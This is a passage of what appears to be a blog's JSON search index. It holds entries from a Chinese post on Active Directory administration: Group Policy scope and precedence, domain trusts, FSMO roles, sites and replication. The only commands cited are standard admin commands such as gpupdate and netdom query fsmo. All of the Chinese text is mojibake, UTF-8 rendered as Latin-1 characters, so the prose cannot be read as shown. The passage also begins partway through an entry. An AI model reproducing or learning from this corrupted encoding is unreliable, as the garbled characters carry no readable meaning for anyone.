æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»´åº¦äºŒï¼šå®‰é…ç½®æ˜¯å¦å¯ä»¥è¢«æ›´æ”¹ ç­–ç•¥ é¦–é€‰é¡¹ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»´åº¦ä¸‰ï¼šæŒ‰é…ç½®å†…å®¹é¢†åŸŸ Windows è®¾ç½® ç®¡ç†æ¨¡æ¿ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:16:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„é…ç½® ç³»ç»Ÿé»˜è®¤åŒ…å«ä¸¤ä¸ªé»˜è®¤çš„ GPO Default Domain Policy åŸŸçº§åˆ«ï¼Œå½±å“åŸŸä¸­æ‰€æœ‰çš„è®¡ç®—æœºå’Œç”¨æˆ· Default Domain Controller Policy å®¹å™¨çº§åˆ«ï¼Œå½±å“æ‰€æœ‰åŸŸæ§åˆ¶å™¨ å…¶å®ƒçš„ GPO éœ€è¦è‡ªè¡Œåˆ›å»ºé…ç½®å’Œé“¾æ¥ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:17:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"éƒ¨ç½²çš„æ³¨æ„äº‹é¡¹ GPO éœ€è¦åœ¨åŸŸæ§åˆ¶å™¨ä¸Šé…ç½®ï¼Œä¸”ä¼šé€šè¿‡ AD çš„å¤åˆ¶æœºåˆ¶å‘å…¶ä»–åŸŸæ§åŒæ­¥ GPO åˆ›å»ºç¼–è¾‘ååªæœ‰é“¾æ¥åˆ°åŸŸæˆ– OU æ‰èƒ½ä½¿è¯¥ç»„ç­–ç•¥ç”Ÿæ•ˆ ä¸€æ¡ GPO å¯ä»¥å…³è”åˆ°å¤šä¸ª OU ä¸Šï¼Œä¸€ä¸ª OU ä¸Šä¹Ÿå¯åŒ…å«å¤šæ¡ä¸åŒçš„ GPO åˆ é™¤ GPO é“¾æ¥å¹¶ä¸ç­‰äºåˆ é™¤ GPOï¼Œä½†åˆ é™¤ GPO ä¼šè‡ªåŠ¨åˆ é™¤ç›¸å…³è”çš„ GPO é“¾æ¥ å¦‚éœ€è®© GPO ä¸ç”Ÿæ•ˆï¼Œå¯ä»¥ç¦ç”¨ GPO çš„æŸä¸ªé“¾æ¥ï¼Œä¹Ÿå¯ä»¥æ•´ä½“ä¸å¯ç”¨è¯¥ GPOï¼Œä¸ä¸€å®šéœ€è¦åˆ é™¤GPO é“¾æ¥æˆ–åˆ é™¤ GPO ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:18:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„åº”ç”¨èŒƒå›´ GPO åˆ›å»ºåä¸èƒ½ç›´æ¥åº”ç”¨åœ¨è®¡ç®—æœºã€ç”¨æˆ·æˆ–ç”¨æˆ·ç»„ä¸Šï¼Œè€Œæ˜¯å¿…é¡»è¦é“¾æ¥åˆ° AD æ´»åŠ¨ç›®å½•ä¸­çš„å®¹å™¨æˆ– OU ä¸Šï¼Œæˆ–ç›´æ¥è¿ç”¨åœ¨æ•´ä¸ªåŸŸçº§åˆ« GPO é»˜è®¤ä¼šå¯¹åŸŸæˆ– OU ä¸‹æ‰€æœ‰è®¡ç®—æœº/ç”¨æˆ·ç”Ÿæ•ˆï¼Œå¦‚è¦å¯¹åº”ç”¨èŒƒå›´åšè¿›ä¸€æ­¥ç²¾ç¡®æ§åˆ¶ï¼Œå¯ä½¿ç”¨å®‰å…¨è¿‡æ»¤(Security Filtering) æˆ– WMIç­›é€‰å™¨(WMI Filtering) GPO ä¹Ÿå¯ä»¥å¯¹é»˜è®¤çš„åº”ç”¨èŒƒå›´è®¾ç½®ä¸ªåˆ«çš„æ’é™¤å¯¹è±¡ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:19:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„ç”Ÿæ•ˆæ—¶é—´ è®¡ç®—æœºå¯åŠ¨æ—¶è‡ªåŠ¨è·å–å¹¶ç”Ÿæ•ˆã€Œè®¡ç®—æœºé…ç½®ã€æ¡ç›® ç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨è·å–å¹¶ç”Ÿæ•ˆã€Œç”¨æˆ·é…ç½®ã€æ¡ç›® è®¡ç®—æœºå·²å¼€æœºæˆ–ç”¨æˆ·å·²ç™»å½•åˆ™é»˜è®¤éœ€ 90-120 åˆ†é’Ÿæ‰ä¼šç”Ÿæ•ˆ(90åˆ†é’ŸåŠ 30åˆ†é’Ÿéšæœºå€¼ï¼Œä»¥é¿å…å¹¶å‘é«˜å³°ï¼Œè¯¥æ—¶é—´å¯é…) å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡å‘½ä»¤ gpupdate/force å¼ºåˆ¶è·å–å¹¶åˆ·æ–°ç»„ç­–ç•¥ éƒ¨åˆ†è®¾ç½®å³ä½¿åº”ç”¨åä¹Ÿéœ€è¦é‡å¯è®¡ç®—æœºæˆ–ç”¨æˆ·æ³¨é”€é‡æ–°ç™»å½•æ‰èƒ½ç”Ÿæ•ˆ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:20:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å®¢æˆ·ç«¯æŸ¥çœ‹å½“å‰åº”ç”¨çš„ GPOï¼š gpresult /h d:\\gporesult.html gpresult /r ##ç»„ç­–ç•¥çš„å¤„ç†åŸåˆ™ ç»§æ‰¿åŸåˆ™ å¯ç”¨/ç¦ç”¨ç»§æ‰¿ ç´¯åŠ æ€§åŸåˆ™ ä¼˜å…ˆåŸåˆ™ å­OU \u003e çˆ¶OU \u003e åŸŸ \u003e ç«™ç‚¹ \u003e æœ¬åœ°ç­–ç•¥ é¡ºåºåŸåˆ™ åŒä¸€ä¸ª OU ä¸­å¤šæ¡ GPO æŒ‰ä¸Šä¸‹æ¬¡åº å…¶ä»–åŸåˆ™ OUä¸­åªæœ‰è®¡ç®—æœºåˆ™åªåº”ç”¨â€œè®¡ç®—æœºé…ç½®â€ OUä¸­åªæœ‰ç”¨æˆ·åˆ™åªåº”ç”¨ä¼˜å…ˆäºâ€œç”¨æˆ·é…ç½®â€ OUä¸­åŒæ—¶æœ‰è®¡ç®—æœºå’Œç”¨æˆ·åˆ™ä¸¤ç±»é…ç½®éƒ½å¯ç”¨(æœ‰å†²çªæ—¶è®¡ç®—æœºé…ç½®ä¼˜å…ˆ) ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:21:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„å…¶å®ƒæ“ä½œ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:22:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„å¤‡ä»½ä¸æ¢å¤ å¯ä»¥å¤‡ä»½å•æ¡ GPOï¼Œä¹Ÿå¯ä»¥å¤‡ä»½æ‰€æœ‰ GPO æ¯æ¬¡å¤‡ä»½ä¼šè®°å½•æ—¶é—´æˆ³ï¼Œå› æ­¤å¯ä»¥åŸºäºä¿å­˜å¤šä»½å†å²ç‰ˆæœ¬åšç²¾ç¡®æ¢å¤ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:22:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„å­˜å‚¨ åŸŸçš„ä¿¡ä»»å…³ç³» ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:22:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä¿¡ä»»å…³ç³»çš„æ¦‚å¿µ åŸŸæ˜¯å®‰å…¨è¾¹ç•Œï¼Œå¦‚æœåŸŸä¹‹é—´æ²¡æœ‰ä¿¡ä»»å…³ç³»ï¼Œæ¯ä¸ªåŸŸä¸­çš„ç”¨æˆ·åªèƒ½è®¿é—®æœ¬åŸŸå†…çš„èµ„æº ä¿¡ä»»å…³ç³»åœ¨ä¸¤ä¸ªåŸŸä¹‹é—´æ¶èµ·äº†ä¸€åº§æ¡¥æ¢(ä¿¡ä»»è·¯å¾„)ï¼Œä½¿å¾—åŸŸç”¨æˆ·å¸æˆ·å¯ä»¥è·¨åŸŸä½¿ç”¨ï¼Œå®ç°äº†è·¨åŸŸçš„èº«ä»½éªŒè¯å’Œèµ„æºè®¿é—® ä¿¡ä»»å…³ç³»å¸¸ç”¨çš„åœºæ™¯åŒ…æ‹¬å…¬å¸å¹¶è´­ã€å¤–éƒ¨åˆä½œã€æ´»åŠ¨ç›®å½•è¿å¾™ç­‰ æ ¹æ®åŸŸç±»å‹çš„ä¸åŒï¼Œæœ‰äº›åŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»é»˜è®¤å­˜åœ¨ï¼Œæœ‰äº›åˆ™éœ€è¦æ‰‹å·¥åˆ›å»º ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä¿¡ä»»å…³ç³»çš„æ–¹å‘æ€§ A åŸŸå•å‘ä¿¡ä»» B åŸŸ A åŸŸä¸­çš„èµ„æºå¯ä»¥è¢« B åŸŸè®¿é—® A åŸŸå’Œ B åŸŸåŒå‘ä¿¡ä»» A åŸŸä¸­çš„èµ„æºå¯ä»¥è¢« B åŸŸè®¿é—® B åŸŸä¸­çš„èµ„æºå¯ä»¥è¢« A åŸŸè®¿é—® ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä¿¡ä»»å…³ç³»çš„ä¼ é€’æ€§ ä¿¡ä»»å…³ç³»å¦‚æœæ˜¯å¯ä¼ é€’çš„ï¼Œåˆ™å¤šä¸ªå¯ä¼ é€’çš„ä¿¡ä»»å…³ç³»å¯ä»¥è‡ªåŠ¨ä¸²æ¥ ä¿¡ä»»å…³ç³»å¦‚æœæ˜¯ä¸å¯ä¼ é€’çš„ï¼Œåˆ™ä¿¡ä»»é“¾æ–­è£‚ï¼Œæ— æ³•å®Œæˆä¿¡ä»»å…³ç³»è‡ªåŠ¨ä¸²æ¥ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ—å†…çš„ä¿¡ä»»å…³ç³» ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ—é—´çš„ä¿¡ä»»å…³ç³» ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¿«æ·ä¿¡ä»» ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä¿¡ä»»å…³ç³»æ€»ç»“ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:23:6","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä¿¡ä»»å…³ç³»çš„é…ç½® ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ—å†…çš„ä¿¡ä»»å…³ç³» çˆ¶å­ä¿¡ä»»ï¼Œæ ‘æ ¹ä¿¡ä»»å‡ä¸ºé»˜è®¤å­˜åœ¨ï¼Œæ— éœ€æ‰‹å·¥åˆ›å»º ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ—é—´çš„ä¿¡ä»»å…³ç³» æ£®æ—ä¿¡ä»»æˆ–å¤–éƒ¨ä¿¡ä»»éœ€æ‰‹å·¥åˆ›å»ºï¼Œé…ç½®å¯ä»¥æ˜¯å•å‘æˆ–åŒå‘ æœ¬åŸŸéœ€è¦ DNS æŸ¥è¯¢èƒ½å¤Ÿå¾—åˆ°å¯¹æ–¹åŸŸæ§åˆ¶å™¨çš„ SRV è®°å½•(æ¡ä»¶è½¬å‘æˆ–è¾…åŠ©åŒºåŸŸåŒæ­¥) ã€Œä¿¡ä»»æ–¹ã€å’Œã€Œè¢«ä¿¡ä»»æ–¹ã€ä¸¤è¾¹åˆ†åˆ«é…ç½®ä¿¡ä»»çš„ã€Œå†…å‘ã€å’Œã€Œå¤–å‘ã€ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä¿¡ä»»çš„å®‰å…¨å¢å¼º é€‰æ‹©æ€§èº«ä»½è®¤è¯ åç§°åç¼€è·¯ç”± æ“ä½œä¸»æœº FSMO ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:24:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ“ä½œä¸»æœºæ¦‚è¿° åŸŸæ§åˆ¶å™¨ä¹‹é—´éœ€è¦åŒæ­¥ AD çš„æ•°æ®åº“ å¤§éƒ¨åˆ†çš„æ•°æ®åŒæ­¥é‡‡ç”¨å¤šä¸»æœºå¤åˆ¶æœºåˆ¶ å°‘éƒ¨åˆ†çš„æ•°æ®åŒæ­¥é‡‡ç”¨å•ä¸»æœºå¤åˆ¶æœºåˆ¶ æ“ä½œä¸»æœºå³ç”¨äºè¿™ç±»ç‰¹æ®Šçš„å•ä¸»æœºå¤åˆ¶ï¼Œä»¥æ»¡è¶³ç‰¹æ®Šåœºæ™¯ä¸‹æ›´é«˜æ•ˆå¯æ§çš„æ•°æ®åŒæ­¥ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ“ä½œä¸»æœºçš„è§’è‰² é»˜è®¤ç¬¬ä¸€å°å®‰è£…çš„åŸŸæ§åˆ¶å™¨æ‰¿æ‹…äº†æ‰€æœ‰çš„è§’è‰² ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ“ä½œä¸»æœºçš„ä½œç”¨ æ—çº§åˆ« åŸŸçº§åˆ« ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ“ä½œä¸»æœºè§’è‰²çš„æŸ¥çœ‹ å‘½ä»¤è¡Œæ–¹å¼ æŸ¥è¯¢æ‰€æœ‰çš„ FSMO è§’è‰² netdom query fsmo å›¾å½¢åŒ–æ–¹å¼ ç«™ç‚¹åŠæ´»åŠ¨ç›®å½•å¤åˆ¶ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:25:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç«™ç‚¹çš„æ¦‚å¿µ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸç”¨æˆ·ç™»å½•è¿‡ç¨‹ PC ç»ˆç«¯å‘ DNS æŸ¥è¯¢ DC çš„ SRV è®°å½•ï¼Œè·å–åŸŸå†…æ‰€æœ‰ DC çš„IP æ ¹æ® DNS ä¸­é…ç½®çš„ä¼˜å…ˆçº§å’Œæƒé‡ç­‰å› ç´ ï¼Œè¿”å›æä¾›æœåŠ¡çš„ DC åŸŸæ§åˆ¶å™¨çš„ IP å¦‚æœæ‰€æœ‰ DC çš„ä¼˜å…ˆçº§å’Œæƒé‡ç›¸åŒï¼Œåˆ™è¿”å›æ‰€æœ‰çš„ DC çš„IPï¼Œæ­¤æ—¶ä¼šå¯¼è‡´ PC ç»ˆç«¯æ‰€é€‰æ‹©çš„ DC æ§åˆ¶å™¨ä¼šå…·æœ‰ä¸€å®šçš„éšæœºæ€§ æ³¨ï¼š å¯ç”¨ set loginserver æŸ¥çœ‹å½“å‰è®¡ç®—æœºç”±å“ªå° DC æœåŠ¡ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"é—®é¢˜ä¸æŒ‘æˆ˜ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç«™ç‚¹-Site ç«™ç‚¹ç”± IP å­ç½‘æ„æˆï¼Œç«™ç‚¹å†…çš„èŠ‚ç‚¹å¯ä»¥ç›¸äº’é«˜é€Ÿé€šä¿¡ é»˜è®¤æƒ…å†µä¸‹æ‰€æœ‰çš„åŸŸæ§åˆ¶å™¨éƒ½åœ¨ä¸€ä¸ªç«™ç‚¹ä¸­(Default-first-site-name) éƒ¨ç½²å¤šä¸ªç«™ç‚¹çš„ç›®çš„æ˜¯ä¼˜åŒ–ç«™ç‚¹é—´ DC çš„å¤åˆ¶åŒæ­¥ï¼ŒåŒæ—¶ä½¿å®¢æˆ·ç«¯èƒ½å¤Ÿå’Œå°±è¿‘çš„ DC ä¼˜å…ˆé€šä¿¡ï¼Œä¼˜åŒ–ç™»å½•éªŒè¯çš„æ“ä½œ å»ºè®®æ ¹æ®åœ°ç†ä½ç½®å’Œäº’é€šå¸¦å®½çš„å®é™…æƒ…å†µï¼Œå®šä¹‰ã€ŒåŸŸæ§åˆ¶å™¨ã€ã€ã€ŒiPå­ç½‘ã€ã€ã€Œç«™ç‚¹ã€ä¸‰è€…ä¹‹é—´çš„å…³ç³» IP ç»ˆç«¯åœ¨ç™»å½•æ—¶ä¼šè‡ªåŠ¨æ ¹æ®è‡ªèº« IP åœ°å€åœ¨ DNS ä¸­å¯»æ‰¾åŒ…å«æœ¬ IP å­ç½‘çš„ç«™ç‚¹ä¸­çš„ DC è¿›è¡Œç™»å½• ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:26:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç«™ç‚¹å†…çš„æ•°æ®å¤åˆ¶ åŒä¸€ç«™ç‚¹å†…å¤šä¸ª DC ä¹‹é—´çš„å¤åˆ¶é‡‡ç”¨å¤šä¸»æœºå¤åˆ¶æ¨¡å¼(multimaster replication) KCCç®—æ³•(Knowledge Consistency Checker)è´Ÿè´£è‡ªåŠ¨è®¡ç®—æ¯å° DC çš„å¤åˆ¶è·¯å¾„ï¼Œç¡®ä¿ä»æ›´æ–°çš„å§‹å‘ DC åˆ°æœ€è¿œç«¯çš„ DC ä¹‹é—´çš„å¤åˆ¶å…³ç³»ä¸è¶…è¿‡ 3 è·³ å½“ä¸€å° DC å‘ç”Ÿæ•°æ®æ”¹å˜åï¼Œé»˜è®¤ç­‰å¾… 15 ç§’åï¼Œé€šçŸ¥ã€Œç›´æ¥å¤åˆ¶ä¼™ä¼´ã€æ¥è·å–æ›´æ–°ï¼Œç›´æ¥å¤åˆ¶ä¼™ä¼´åœ¨è·å–æ›´æ–°åï¼Œä¼šä»¥ç›¸åŒçš„æ–¹å¼é€šçŸ¥è‡ªå·±çš„å¤åˆ¶ä¼™ä¼´æ¥è·å–æ›´æ–°ï¼Œç›´åˆ°ç«™ç‚¹å†…æ‰€æœ‰çš„ DC éƒ½è·å–åˆ°è¯¥æ›´æ–° 